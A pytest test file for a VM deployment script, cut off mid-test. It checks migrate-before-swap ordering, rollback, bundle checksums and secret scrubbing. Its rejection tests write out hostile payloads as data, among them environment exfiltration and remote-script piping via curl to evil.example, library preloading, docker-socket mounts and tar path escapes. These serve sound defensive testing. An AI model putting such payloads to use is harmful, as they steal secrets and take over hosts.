"""story 4796 — the pull-based deployer of the VM (deploy/vm/bin/deployer.py), run against a fake bucket, a fake docker and a temporary install folder.

What is pinned: the ORDER of a deploy (migrate before the swap), that a failure before the swap leaves the running release alone, that a failure after the swap puts the
previous release back, that a version that failed after the swap is not tried again every minute, that a bundle is checked (checksum, no escapes), and that no secret value
reaches a file the deployer writes or the status it uploads.
"""
from __future__ import annotations

import hashlib
import importlib.util
import io
import json
import sys
import tarfile
import urllib.error
from pathlib import Path
from typing import Any

import pytest

_ROOT = Path(__file__).resolve().parents[2]
_VM = _ROOT / "deploy/vm"
sys.path.insert(0, str(_VM / "bin"))


def _load(name: str):
    spec = importlib.util.spec_from_file_location(name, _VM / "bin" / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    assert spec.loader is not None
    spec.loader.exec_module(mod)
    return mod


renv = _load("render_env")
D = _load("deployer")

SECRET = "SECRET-VALUE-do-not-leak"
PASSWORD = "0123456789abcdef0123456789abcdef"
BUCKET, BACKUPS = "sprintable-vm-dev-deploy", "sprintable-vm-dev-backups"
PRIVATE_IP = "10.178.0.2"


def _digest(sha: str) -> str:
    return "sha256:" + hashlib.sha256(sha.encode()).hexdigest()


REG = "asia-northeast3-docker.pkg.dev/proj/repo"


def _bundle(extra: dict[str, bytes] | None = None, links: list[tuple[str, str]] = ()) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for rel in ("compose.yml", "Caddyfile", "env/dev.yaml"):
            data = (_VM / rel).read_bytes()
            ti = tarfile.TarInfo(rel)
            ti.size = len(data)
            ti.mode = 0o644
            tar.addfile(ti, io.BytesIO(data))
        for rel, data in (extra or {}).items():
            ti = tarfile.TarInfo(rel)
            ti.size = len(data)
            tar.addfile(ti, io.BytesIO(data))
        for name, target in links:
            ti = tarfile.TarInfo(name)
            ti.type = tarfile.SYMTYPE
            ti.linkname = target
            tar.addfile(ti)
    return buf.getvalue()


class FakeStore:
    def __init__(self) -> None:
        self.objects: dict[tuple[str, str], bytes] = {}
        self.puts: list[tuple[str, str, Any]] = []

    def get(self, bucket: str, name: str):
        return self.objects.get((bucket, name))

    def put_json(self, bucket: str, name: str, obj: Any) -> None:
        self.puts.append((bucket, name, obj))


class FakeRunner:
    """records every docker call; `script` decides the exit code of calls whose argument list contains a marker"""

    def __init__(self) -> None:
        self.calls: list[dict] = []
        self.fail_on: dict[str, int] = {}   # marker → rc
        self.healthy_after = 0               # number of failing health probes before the first green one
        self._probes = 0
        self.frontend_ok = True
        self.out_suffix = ""
        self.raise_on: dict[str, Exception] = {}
        self.metadata_rc = 1   # the gateway database container asked for the metadata server: refused (1) is the answer wanted; 0 would mean it can reach it

    def run(self, args, env, cwd=None, timeout=900, stdin=None):
        self.calls.append({"args": list(args), "env": dict(env), "stdin": stdin})
        joined = " ".join(args)
        for marker, exc in self.raise_on.items():
            if marker in joined:
                raise exc
        if "169.254.169.254" in joined:
            return self.metadata_rc, ""
        if "process.exit(r.status<500" in joined:
            return (0, "") if self.frontend_ok else (1, "frontend down")
        if "HEALTH" in joined or "import sys,urllib.request" in joined:
            self._probes += 1
            return (0, "") if self._probes > self.healthy_after else (1, "not ready")
        for marker, rc in self.fail_on.items():
            if marker in joined:
                return rc, f"{marker} failed{self.out_suffix}"
        return 0, ""

    def verbs(self) -> list[str]:
        out = []
        for c in self.calls:
            a = c["args"]
            if a[:2] == ["docker", "compose"]:
                rest = [x for x in a[2:] if x not in ("-f", "--profile") and not x.endswith(".yml") and x != "migrate" or x == "migrate"]
                verb = next((x for x in a[2:] if x in ("pull", "up", "run", "exec", "stop")), "?")
                if verb == "up":
                    verb = "up:gwdb" if a[-1] == "gateway-db" else "up:db" if a[-1] == "db" else "up:all"
                if verb == "exec":
                    tail = a[a.index("exec"):]
                    verb = "exec:" + ("gwdb-metadata" if "169.254.169.254" in " ".join(tail) else "gwdb-reload" if "pg_reload_conf" in " ".join(tail) else "health-gwdb" if "gateway-db" in tail
                                      else "reload" if "reload" in a else "health-be" if "python" in a else "health-fe")
                out.append(verb)
            else:
                out.append(a[1])
        return out


class Clock:
    def __init__(self) -> None:
        self.t = 1_000_000.0

    def now(self) -> float:
        return self.t

    def sleep(self, s: float) -> None:
        self.t += s


@pytest.fixture()
def world(tmp_path: Path):
    decl = renv.load_declaration(_VM / "env/dev.yaml")
    plain = {name: {n: "plain" for n in svc["live_plain"]} for name, svc in decl["services"].items()}
    pp = tmp_path / "private-plain.json"
    pp.write_text(json.dumps(plain))
    pp.chmod(0o600)
    cfg = D.Config(
        environment="dev", project="proj", deploy_bucket=BUCKET, backups_bucket=BACKUPS,
        install_dir=tmp_path / "opt", state_dir=tmp_path / "state", data_dir=tmp_path / "data", private_plain=pp,
        acme_email="ops@example.test", health_timeout=30, health_interval=5, trusted_compose=_VM / "compose.yml",
    )
    store, runner, clock = FakeStore(), FakeRunner(), Clock()
    logs: list[str] = []
    dep = D.Deployer(cfg, store, runner, lambda sid: SECRET if sid != decl["database"]["password_secret"] else PASSWORD, lambda: "vm-token-abc123",
                     private_ip=lambda: PRIVATE_IP, sleep=clock.sleep, now=clock.now, log=logs.append)

    def publish(sha: str = "a" * 40, backend: str | None = None, frontend: str | None = None, bundle: bytes | None = None, sha256: str | None = None) -> dict:
        blob = bundle if bundle is not None else _bundle()
        desired = {
            "sha": sha, "backend_image": backend or f"{REG}/backend@{_digest(sha)}",
            "frontend_image": frontend or f"{REG}/frontend-vm@{_digest(sha)}",
            "bundle": f"bundles/{sha}.tgz", "bundle_sha256": sha256 or hashlib.sha256(blob).hexdigest(),
        }
        store.objects[(BUCKET, f"bundles/{sha}.tgz")] = blob
        store.objects[(BUCKET, "desired.json")] = json.dumps(desired).encode()
        return desired

    return type("W", (), {"cfg": cfg, "store": store, "runner": runner, "clock": clock, "dep": dep, "publish": staticmethod(publish), "logs": logs})


def _state(w, name: str):
    p = w.cfg.state_dir / name
    return json.loads(p.read_text()) if p.exists() else None


def _text_tree(root: Path) -> str:
    return "\n".join(p.read_text(errors="ignore") for p in root.rglob("*") if p.is_file())


# ───────────────────────── the happy path ─────────────────────────

def test_a_deploy_migrates_before_it_swaps_and_checks_health_after(world) -> None:
    d = world.publish("a" * 40)
    assert world.dep.run_once() == "deployed"
    assert world.runner.verbs() == ["login", "pull", "logout", "up:db", "up:gwdb", "exec:gwdb-metadata", "run", "up:all", "exec:reload", "exec:gwdb-reload", "exec:health-be", "exec:health-fe", "exec:health-gwdb"]
    cur = _state(world, "current.json")
    assert cur["sha"] == d["sha"] and cur["previous"] is None
    assert (world.cfg.install_dir / "releases" / d["sha"] / "compose.yml").exists()
    up = next(c for c in world.runner.calls if c["args"][:2] == ["docker", "compose"] and "up" in c["args"] and "--wait-timeout" in c["args"])
    assert up["env"]["BACKEND_IMAGE"] == d["backend_image"] and up["env"]["FRONTEND_IMAGE"] == d["frontend_image"]
    assert up["env"]["BACKEND__JWT_SECRET"] == SECRET and up["env"]["FRONTEND__JWT_SECRET"] == SECRET
    assert up["env"]["ALEMBIC_DATABASE_URL"] == f"postgresql://sprintable:{PASSWORD}@db:5432/sprintable"
    assert up["env"]["POSTGRES_PASSWORD"] == PASSWORD


def test_registry_login_uses_the_vm_token_on_stdin_not_the_command_line(world) -> None:
    world.publish()
    world.dep.run_once()
    login = world.runner.calls[0]
    assert login["args"][:2] == ["docker", "login"] and login["stdin"] == "vm-token-abc123" and "vm-token-abc123" not in " ".join(login["args"])
    assert login["args"][-1] == "asia-northeast3-docker.pkg.dev"
    logout = next(c for c in world.runner.calls if c["args"][:2] == ["docker", "logout"])
    assert logout["args"][-1] == "asia-northeast3-docker.pkg.dev", "the registry login is removed again right after the pull"
    assert login["env"]["DOCKER_CONFIG"] == str(world.cfg.state_dir / "docker")


def test_no_secret_value_reaches_a_file_the_deployer_wrote_or_the_status(world) -> None:
    world.publish()
    world.dep.run_once()
    written = _text_tree(world.cfg.install_dir / "runtime") + _text_tree(world.cfg.state_dir)
    assert SECRET not in written and PASSWORD not in written
    assert SECRET not in json.dumps(world.store.puts) and PASSWORD not in json.dumps(world.store.puts)
    assert SECRET not in "\n".join(world.logs)
    pt = (world.cfg.install_dir / "runtime/pass-through.yml").read_text()
    assert "${BACKEND__JWT_SECRET}" in pt and "${FRONTEND__NEXT_PUBLIC_FASTAPI_URL}" in pt


def test_the_status_goes_to_the_backups_bucket_never_the_deploy_bucket(world) -> None:
    world.publish()
    world.dep.run_once()
    import re as _re
    assert world.store.puts and all(b == BACKUPS and _re.fullmatch(r"status/dev/\d+-\d+\.json", n) for b, n, _ in world.store.puts)
    names = [n for _b, n, _d in world.store.puts]
    assert len(set(names)) == len(names), "every status object is new (the VM may create objects but not replace or delete them)"
    assert world.store.puts[-1][2]["state"] == "deployed"


def test_the_same_desired_version_does_nothing(world) -> None:
    world.publish()
    world.dep.run_once()
    n = len(world.runner.calls)
    assert world.dep.run_once() == "up-to-date"
    assert len(world.runner.calls) == n


def test_a_second_version_remembers_the_first_as_previous(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    world.publish("b" * 40)
    assert world.dep.run_once() == "deployed"
    cur = _state(world, "current.json")
    assert cur["sha"] == "b" * 40 and cur["previous"]["sha"] == "a" * 40


# ───────────────────────── failures before the swap leave the running release alone ─────────────────────────

def test_a_failed_migration_never_reaches_the_swap(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    world.publish("b" * 40)
    world.runner.fail_on["migrate"] = 1
    world.runner.calls.clear()
    assert world.dep.run_once() == "failed"
    assert "up:all" not in world.runner.verbs() and "exec:reload" not in world.runner.verbs()
    assert _state(world, "current.json")["sha"] == "a" * 40
    assert _state(world, "failed.json")["phase"] == "pre-swap"


def test_a_pre_swap_failure_is_retried_after_five_minutes_not_every_minute(world) -> None:
    world.publish()
    world.runner.fail_on["pull"] = 1
    assert world.dep.run_once() == "failed"
    n = len(world.runner.calls)
    world.clock.sleep(60)
    assert world.dep.run_once() == "skipping-failed" and len(world.runner.calls) == n
    world.clock.sleep(300)
    world.runner.fail_on.clear()
    assert world.dep.run_once() == "deployed"
    assert _state(world, "failed.json") is None


def test_a_wrong_bundle_checksum_stops_before_any_docker_call(world) -> None:
    world.publish(sha256="0" * 64)
    assert world.dep.run_once() == "failed"
    assert world.runner.calls == []


def test_a_missing_bundle_stops_before_any_docker_call(world) -> None:
    world.publish()
    del world.store.objects[(BUCKET, f"bundles/{'a' * 40}.tgz")]
    assert world.dep.run_once() == "failed" and world.runner.calls == []


def test_a_private_plain_file_others_can_read_is_refused(world) -> None:
    world.publish()
    world.cfg.private_plain.chmod(0o644)
    assert world.dep.run_once() == "failed"
    assert world.runner.calls == []
    assert "must be a plain file" in _state(world, "failed.json")["detail"]


def test_a_secret_that_cannot_be_read_stops_the_deploy_and_names_it(world) -> None:
    world.publish()

    def deny(sid: str) -> str:
        raise PermissionError(SECRET)

    world.dep.secrets = deny
    assert world.dep.run_once() == "failed" and world.runner.calls == []
    assert SECRET not in json.dumps(_state(world, "failed.json")) and SECRET not in json.dumps(world.store.puts)


def test_a_declaration_for_another_environment_is_refused(world) -> None:
    world.publish()
    world.cfg.environment = "prod"
    assert world.dep.run_once() == "failed" and world.runner.calls == []


# ───────────────────────── failures after the swap put the previous release back ─────────────────────────

def test_health_that_never_turns_green_rolls_back_to_the_previous_release(world) -> None:
    a = world.publish("a" * 40)
    world.dep.run_once()
    b = world.publish("b" * 40)
    world.runner._probes = 0
    world.runner.healthy_after = 10**6  # never green …
    world.runner.calls.clear()
    # … except that the rollback must be allowed to succeed: flip health on once the rollback's `up` has been issued
    orig = world.runner.run

    def run(args, env, **kw):
        if env.get("BACKEND_IMAGE") == a["backend_image"] and "up" in args:
            world.runner.healthy_after = 0
            world.runner._probes = 0
        return orig(args, env, **kw)

    world.runner.run = run
    assert world.dep.run_once() == "rolled-back"
    ups = [c["env"]["BACKEND_IMAGE"] for c in world.runner.calls if "up" in c["args"] and "--wait-timeout" in c["args"]]
    assert ups == [b["backend_image"], a["backend_image"]]
    assert _state(world, "current.json")["sha"] == "a" * 40
    assert world.store.puts[-1][2]["state"] == "rolled-back" and world.store.puts[-1][2]["serving"] == "a" * 40


def test_a_frontend_that_does_not_answer_is_as_bad_as_a_backend_that_does_not(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    world.publish("b" * 40)
    world.runner.frontend_ok = False
    assert world.dep.run_once() in ("rolled-back", "rollback-failed")
    assert _state(world, "current.json")["sha"] == "a" * 40


def test_a_version_that_failed_after_the_swap_is_not_tried_again_until_it_changes(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    world.publish("b" * 40)
    world.runner.fail_on["up -d --remove-orphans"] = 1
    world.dep.run_once()
    world.runner.fail_on.clear()
    world.runner.calls.clear()
    world.clock.sleep(10_000)
    # the rollback of the first attempt failed too, so the marker is still there: the recorded release a is put back first (and only that) …
    assert world.dep.run_once() == "skipping-failed"
    verbs = world.runner.verbs()
    assert "pull" not in verbs and "run" not in verbs, "… b is not tried again"
    assert all(c["env"]["BACKEND_IMAGE"].endswith(_digest("a" * 40)) for c in world.runner.calls if "--wait-timeout" in c["args"])
    world.runner.calls.clear()
    assert world.dep.run_once() == "skipping-failed" and world.runner.calls == [], "… and once consistent again nothing happens at all"
    assert world.dep.run_once(force=True) == "deployed"
    world.publish("c" * 40)
    assert world.dep.run_once() == "deployed"


def test_a_first_deploy_that_fails_after_the_swap_has_nothing_to_go_back_to(world) -> None:
    world.publish()
    world.runner.fail_on["up -d --remove-orphans"] = 1
    assert world.dep.run_once() == "failed-no-previous"
    assert _state(world, "current.json") is None
    stop = next(c for c in world.runner.calls if "stop" in c["args"])
    assert [x for x in stop["args"] if x in ("backend", "frontend", "caddy", "db")] == ["backend", "frontend", "caddy"], "a failed first release must not keep serving; the database stays up"


def test_when_even_the_rollback_fails_it_says_so(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    world.publish("b" * 40)
    world.runner.fail_on["up -d --remove-orphans"] = 1
    assert world.dep.run_once() == "rollback-failed"
    assert world.store.puts[-1][2]["state"] == "rollback-failed"


# ───────────────────────── the bundle and desired.json are checked ─────────────────────────

def test_a_bundle_cannot_write_outside_its_release_folder(world) -> None:
    world.publish(bundle=_bundle({"../../escape.txt": b"x"}))
    assert world.dep.run_once() == "failed"
    assert not (world.cfg.install_dir.parent / "escape.txt").exists() and not (world.cfg.install_dir / "escape.txt").exists()


def test_a_bundle_with_a_link_is_refused(world) -> None:
    world.publish(bundle=_bundle(links=[("env/link", "/etc/passwd")]))
    assert world.dep.run_once() == "failed" and world.runner.calls == []


def test_a_half_extracted_release_is_never_used(world) -> None:
    world.publish(bundle=_bundle(links=[("env/link", "/etc/passwd")]))
    world.dep.run_once()
    assert not (world.cfg.install_dir / "releases" / ("a" * 40)).exists()


@pytest.mark.parametrize("patch", [
    {"sha": "not-hex!"}, {"sha": "abc"}, {"backend_image": "--privileged"}, {"frontend_image": "a b"}, {"frontend_image": f"{REG}/f 1@{_digest('q')}"}, {"frontend_image": f"{REG}/f:latest"}, {"backend_image": f"{REG}/b@sha256:abc"}, {"bundle": "/etc/passwd"}, {"bundle": "../x"}, {"bundle_sha256": ""},
])
def test_a_malformed_desired_json_is_ignored_and_reported(world, patch: dict) -> None:
    d = world.publish()
    world.store.objects[(BUCKET, "desired.json")] = json.dumps({**d, **patch}).encode()
    assert world.dep.run_once() == "bad-desired" and world.runner.calls == []


def test_a_missing_or_unparsable_desired_json_changes_nothing(world) -> None:
    assert world.dep.run_once() == "no-desired"
    world.store.objects[(BUCKET, "desired.json")] = b"{not json"
    assert world.dep.run_once() == "bad-desired" and world.runner.calls == []


def test_old_releases_are_pruned_but_the_running_and_previous_stay(world) -> None:
    for c in "abcdef":
        world.publish(c * 40)
        world.dep.run_once()
    kept = sorted(p.name for p in (world.cfg.install_dir / "releases").iterdir())
    assert "f" * 40 in kept and "e" * 40 in kept
    assert len(kept) <= world.cfg.keep_releases


# ───────────────────────── Cloud Storage ─────────────────────────

class _Resp(io.BytesIO):
    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def test_gcs_store_reads_with_the_vm_token_and_treats_404_as_missing() -> None:
    seen: list = []

    class Reader:
        def token(self) -> str:
            return "tok"

    def urlopen(req, timeout=0):
        seen.append((req.full_url, req.get_header("Authorization"), req.get_method()))
        if "missing" in req.full_url:
            raise urllib.error.HTTPError(req.full_url, 404, "nf", {}, None)
        return _Resp(b"payload")

    s = D.GcsStore(Reader(), urlopen)
    assert s.get("b1", "bundles/x y.tgz") == b"payload"
    assert s.get("b1", "missing") is None
    s.put_json("b2", "status/dev.json", {"a": 1})
    assert seen[0] == ("https://storage.googleapis.com/storage/v1/b/b1/o/bundles%2Fx%20y.tgz?alt=media", "Bearer tok", "GET")
    assert seen[2][0] == "https://storage.googleapis.com/upload/storage/v1/b/b2/o?uploadType=media&name=status%2Fdev.json" and seen[2][2] == "POST"


def test_gcs_errors_other_than_404_are_raised() -> None:
    class Reader:
        def token(self) -> str:
            return "t"

    def urlopen(req, timeout=0):
        raise urllib.error.HTTPError(req.full_url, 403, "no", {}, None)

    with pytest.raises(urllib.error.HTTPError):
        D.GcsStore(Reader(), urlopen).get("b", "n")


def test_a_failing_status_upload_does_not_stop_a_deploy(world) -> None:
    world.publish()

    def boom(*a, **k):
        raise OSError("down")

    world.store.put_json = boom
    assert world.dep.run_once() == "deployed"


def test_db_only_prepares_the_release_and_starts_just_the_database(world) -> None:
    world.publish()
    assert world.dep.db_only() == "db-up"
    assert world.runner.verbs() == ["up:db"]
    assert "--wait" in world.runner.calls[0]["args"] and "db" in world.runner.calls[0]["args"]
    assert (world.cfg.install_dir / "releases" / ("a" * 40) / "compose.yml").exists()
    assert _state(world, "current.json") is None, "restoring is not a deploy: nothing is recorded as running"


def test_db_only_stops_when_the_environment_cannot_be_built(world) -> None:
    world.publish()
    world.cfg.private_plain.chmod(0o644)
    assert world.dep.db_only() == "failed" and world.runner.calls == []


# ───────────────────────── the bundle maker ─────────────────────────

def test_make_bundle_is_reproducible_and_its_desired_json_is_accepted(tmp_path: Path) -> None:
    mb = _load("make_bundle")
    out1, out2 = tmp_path / "o1", tmp_path / "o2"
    for out in (out1, out2):
        assert mb.main(["x", "--sha", "c" * 40, "--backend-image", f"{REG}/b@{_digest('x')}", "--frontend-image", f"{REG}/f@{_digest('x')}", "--out", str(out)]) == 0
    assert (out1 / "bundles" / ("c" * 40 + ".tgz")).read_bytes() == (out2 / "bundles" / ("c" * 40 + ".tgz")).read_bytes()
    d = json.loads((out1 / "desired.json").read_text())
    assert D.validate_desired(d) == d
    assert hashlib.sha256((out1 / d["bundle"]).read_bytes()).hexdigest() == d["bundle_sha256"]
    names = set(tarfile.open(out1 / d["bundle"]).getnames())
    assert {"compose.yml", "Caddyfile", "env/dev.yaml", "bin/deployer.py", "bin/render_env.py", "systemd/sprintable-deploy.timer"} <= names
    assert not any("live-names" in n or "__pycache__" in n or n.endswith(".pyc") for n in names)


def test_a_bundle_made_by_make_bundle_deploys(world, tmp_path: Path) -> None:
    mb = _load("make_bundle")
    mb.main(["x", "--sha", "d" * 40, "--backend-image", f"{REG}/b@{_digest('y')}", "--frontend-image", f"{REG}/f@{_digest('y')}", "--out", str(tmp_path / "o")])
    world.store.objects[(BUCKET, "desired.json")] = (tmp_path / "o/desired.json").read_bytes()
    world.store.objects[(BUCKET, "bundles/" + "d" * 40 + ".tgz")] = (tmp_path / "o/bundles" / ("d" * 40 + ".tgz")).read_bytes()
    assert world.dep.run_once() == "deployed"


def test_make_bundle_refuses_a_sha_that_is_not_hex(tmp_path: Path) -> None:
    mb = _load("make_bundle")
    assert mb.main(["x", "--sha", "main", "--backend-image", "b", "--frontend-image", "f", "--out", str(tmp_path)]) == 2


def test_a_declaration_for_another_environment_or_bucket_inside_the_bundle_is_refused(world) -> None:
    import yaml
    decl = yaml.safe_load((_VM / "env/dev.yaml").read_text())
    for patch in ({"environment": "prod"}, {"buckets": {**decl["buckets"], "deploy": "some-other-bucket"}}):
        world.publish(bundle=_bundle({"env/dev.yaml": yaml.safe_dump({**decl, **patch}).encode()}))
        assert world.dep.run_once() == "failed"
        assert "not for this VM" in _state(world, "failed.json")["detail"]
        shutil_rm = __import__("shutil").rmtree
        shutil_rm(world.cfg.install_dir / "releases", ignore_errors=True)
        (world.cfg.state_dir / "failed.json").unlink()
    assert world.runner.calls == []


def test_prune_never_removes_the_running_release_even_when_it_is_the_oldest(world) -> None:
    import os
    world.publish("a" * 40)
    world.dep.run_once()
    releases = world.cfg.install_dir / "releases"
    os.utime(releases / ("a" * 40), (1, 1))
    for i, c in enumerate("12345"):
        d = releases / (c * 40)
        d.mkdir()
        os.utime(d, (100 + i, 100 + i))
    world.publish("b" * 40)
    world.dep.run_once()
    assert (releases / ("a" * 40)).exists() and (releases / ("b" * 40)).exists()


# ───────────────────────── review findings (codex, 4796 AC2) ─────────────────────────

def test_an_image_outside_our_registry_is_refused_and_the_token_goes_nowhere(world) -> None:
    for backend in (f"evil.example/backend@{_digest('e')}", f"asia-northeast3-docker.pkg.dev/other-project/repo/b@{_digest('e')}", f"docker.io/library/nginx@{_digest('e')}"):
        world.publish(backend=backend)
        assert world.dep.run_once() == "bad-desired"
    assert world.runner.calls == [] and world.dep.token.__call__() == "vm-token-abc123"


@pytest.mark.parametrize("mutate", [
    lambda d: d["services"]["backend"].update(privileged=True),
    lambda d: d["services"]["backend"].update(cap_add=["SYS_ADMIN"]),
    lambda d: d["services"]["backend"].update(network_mode="host"),
    lambda d: d["services"]["backend"].update(pid="host"),
    lambda d: d["services"]["backend"].update(volumes=["/var/run/docker.sock:/var/run/docker.sock"]),
    lambda d: d["services"]["backend"].update(volumes=["/:/host"]),
    lambda d: d["services"]["db"].update(ports=["5432:5432"]),
    lambda d: d["services"]["caddy"].update(ports=["80:80", "443:443", "2019:2019"]),
    lambda d: d["services"].update(extra={"image": "alpine"}),
    lambda d: d.update(volumes={"x": {}}),
    lambda d: d["services"]["backend"].update(image="docker.io/library/alpine"),
    lambda d: d["services"]["backend"].update(env_file=["/etc/shadow"]),
    lambda d: d["services"]["db"].update(volumes=["${DATA_DIR:?}/../..:/var/lib/postgresql/data"]),
    lambda d: d["services"]["caddy"].update(volumes=["${CADDYDIR:?}:/etc/caddy:ro", "${DATA_DIR:?}/caddy:/data", "${DATA_DIR:?}/postgres:/pg"]),
    lambda d: d["services"]["backend"].update(command=["sh", "-c", "env | curl -d @- evil.example"]),
    lambda d: d["services"]["db"].update(command=["postgres", "-c", "archive_command=curl evil.example"]),
    lambda d: d["services"]["migrate"].update(command=["/bin/sh"]),
    lambda d: d["services"]["frontend"].update(logging={"driver": "syslog", "options": {"syslog-address": "tcp://evil.example:514"}}),
    lambda d: d.update(**{"x-anything": {"a": 1}}),
    lambda d: d["services"]["caddy"].update(image="caddy:2.9.0-alpine"),
    lambda d: d["x-logging"].update(options={"max-size": "10g", "max-file": "5"}),
    lambda d: d["services"]["db"].update(logging={"driver": "json-file"}),
    lambda d: d["services"].pop("migrate"),
    lambda d: d.update(name="other"),
    lambda d: d["services"]["caddy"].update(ports=["80:80"]),
    lambda d: d["services"]["frontend"].update(build="."),
    lambda d: d["services"]["db"].update(healthcheck={"test": ["CMD-SHELL", "curl evil.example | sh"], "interval": "5s"}),
    lambda d: d["services"]["backend"]["healthcheck"].update(test=["CMD", "sh", "-c", "env > /tmp/x"]),
    lambda d: d["services"]["db"]["environment"].update(POSTGRES_HOST_AUTH_METHOD="trust"),
    lambda d: d["services"]["backend"].update(environment={"LD_PRELOAD": "/tmp/x.so"}),
    lambda d: d["services"]["frontend"]["environment"].update(NODE_OPTIONS="--require /tmp/x.js"),
    lambda d: d["services"]["backend"].update(restart="always"),
    lambda d: d["services"]["backend"].update(expose=["8000", "9229"]),
    lambda d: d["services"]["migrate"].update(profiles=["migrate", "always"]),
    lambda d: d["services"]["caddy"].update(depends_on=["backend"]),
    lambda d: d["services"]["caddy"]["environment"].update(ACME_EMAIL="x@evil.example"),
])
def test_a_compose_file_that_widens_what_runs_as_root_is_refused(world, mutate) -> None:
    import yaml
    doc = yaml.safe_load((_VM / "compose.yml").read_text())
    mutate(doc)
    world.publish(bundle=_bundle({"compose.yml": yaml.safe_dump(doc).encode()}))
    assert world.dep.run_once() == "failed" and world.runner.calls == []


def test_our_own_compose_file_passes_the_check() -> None:
    D.check_compose(_VM / "compose.yml", _VM / "compose.yml")


def test_a_timeout_is_a_return_code_not_a_crash() -> None:
    rc, out = D.Runner().run(["sleep", "5"], {"PATH": "/bin:/usr/bin"}, timeout=0.2)
    assert rc == 124 and "timed out" in out


def test_an_unexpected_error_after_the_swap_still_rolls_back(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    world.publish("b" * 40)
    world.runner.raise_on["import sys,urllib.request"] = OSError("socket gone")
    orig = world.runner.run

    def run(args, env, **kw):
        if env.get("BACKEND_IMAGE", "").endswith(_digest("a" * 40)):
            world.runner.raise_on.clear()
        return orig(args, env, **kw)

    world.runner.run = run
    assert world.dep.run_once() == "rolled-back"
    assert _state(world, "failed.json")["phase"] == "post-swap"
    assert _state(world, "current.json")["sha"] == "a" * 40


def test_an_unexpected_error_before_the_swap_is_a_pre_swap_failure(world) -> None:
    world.publish()
    world.runner.raise_on["pull"] = OSError("disk full")
    assert world.dep.run_once() == "failed"
    assert _state(world, "failed.json")["phase"] == "pre-swap" and "OSError" in _state(world, "failed.json")["detail"]


def test_an_unreadable_desired_json_is_a_status_not_a_crash(world) -> None:
    def boom(bucket, name):
        raise OSError("network")

    world.store.get = boom
    assert world.dep.run_once() == "desired-unreadable"


def test_a_caddy_reload_that_fails_is_a_failed_deploy_and_the_old_caddyfile_comes_back(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    runtime = world.cfg.install_dir / "runtime" / "caddy" / "Caddyfile"
    first = runtime.read_text()
    assert first == (_VM / "Caddyfile").read_text(), "a deploy puts the release's Caddyfile in the file the container mounts"
    world.publish("b" * 40, bundle=_bundle({"Caddyfile": b"# version b\n"}))
    orig = world.runner.run

    def run(args, env, **kw):
        if "reload" in args and env.get("BACKEND_IMAGE", "").endswith(_digest("b" * 40)):
            return 1, "adapting config: bad directive"
        return orig(args, env, **kw)

    world.runner.run = run
    assert world.dep.run_once() == "rolled-back"
    assert runtime.read_text() == first


def test_a_deploy_that_stops_before_the_swap_leaves_the_running_caddyfile_alone(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    runtime = world.cfg.install_dir / "runtime" / "caddy" / "Caddyfile"
    first = runtime.read_text()
    world.publish("b" * 40, bundle=_bundle({"Caddyfile": b"# version b\n"}))
    world.runner.fail_on["migrate"] = 1
    assert world.dep.run_once() == "failed"
    assert runtime.read_text() == first


def test_force_redeploys_the_version_that_is_already_running(world) -> None:
    world.publish()
    world.dep.run_once()
    n = len(world.runner.calls)
    assert world.dep.run_once() == "up-to-date" and len(world.runner.calls) == n
    assert world.dep.run_once(force=True) == "deployed" and len(world.runner.calls) > n


def test_damaged_state_files_do_not_stop_deploys(world) -> None:
    world.publish()
    world.dep.run_once()
    (world.cfg.state_dir / "current.json").write_text("{not json")
    (world.cfg.state_dir / "failed.json").write_text("[]")
    assert world.dep.run_once() == "deployed"
    assert _state(world, "current.json")["sha"] == "a" * 40


def test_command_output_is_scrubbed_of_secret_values_before_it_is_recorded(world) -> None:
    world.publish()
    world.runner.fail_on["migrate"] = 1
    world.runner.out_suffix = f" password={PASSWORD} key={SECRET}"
    assert world.dep.run_once() == "failed"
    recorded = json.dumps(_state(world, "failed.json")) + json.dumps(world.store.puts) + (world.cfg.state_dir / "status.json").read_text()
    assert PASSWORD not in recorded and SECRET not in recorded and "***" in recorded


def test_a_private_plain_file_that_is_a_link_is_refused(world, tmp_path: Path) -> None:
    world.publish()
    real = tmp_path / "elsewhere.json"
    real.write_text(world.cfg.private_plain.read_text())
    real.chmod(0o600)
    world.cfg.private_plain.unlink()
    world.cfg.private_plain.symlink_to(real)
    assert world.dep.run_once() == "failed" and world.runner.calls == []


def test_a_successful_deploy_puts_the_new_caddyfile_in_the_mounted_file(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    world.publish("b" * 40, bundle=_bundle({"Caddyfile": b"# version b\n"}))
    assert world.dep.run_once() == "deployed"
    assert (world.cfg.install_dir / "runtime" / "caddy" / "Caddyfile").read_text() == "# version b\n"


# ───────────────────────── review round 2 ─────────────────────────

def test_a_rollback_does_not_need_secret_manager_to_be_fine_after_the_swap(world) -> None:
    world.publish("a" * 40)
    world.dep.run_once()
    world.publish("b" * 40)
    state = {"swapped": False}
    orig_run = world.runner.run
    orig_secrets = world.dep.secrets

    def run(args, env, **kw):
        if "--wait-timeout" in args and env.get("BACKEND_IMAGE", "").endswith(_digest("b" * 40)):
            state["swapped"] = True
        if state["swapped"] and "import sys,urllib.request" in " ".join(args) and env.get("BACKEND_IMAGE", "").endswith(_digest("b" * 40)):
            return 1, "not ready"
        return orig_run(args, env, **kw)

    def secrets(sid):
        if state["swapped"]:
            raise PermissionError("Secret Manager is down")
        return orig_secrets(sid)

    world.runner.run = run
    world.dep.secrets = secrets
    world.cfg.health_timeout = 10
    assert world.dep.run_once() == "rolled-back"
    assert _state(world, "current.json")["sha"] == "a" * 40


def test_a_failed_first_release_is_stopped_even_if_secrets_are_gone_by_then(world) -> None:
    world.publish()
    state = {"swapped": False}
    orig_secrets = world.dep.secrets
    world.runner.fail_on["--remove-orphans"] = 1

    def secrets(sid):
        if state["swapped"]:
            raise PermissionError("down")
        return orig_secrets(sid)

    orig_run = world.runner.run

    def run(args, env, **kw):
        if "--wait-timeout" in args:
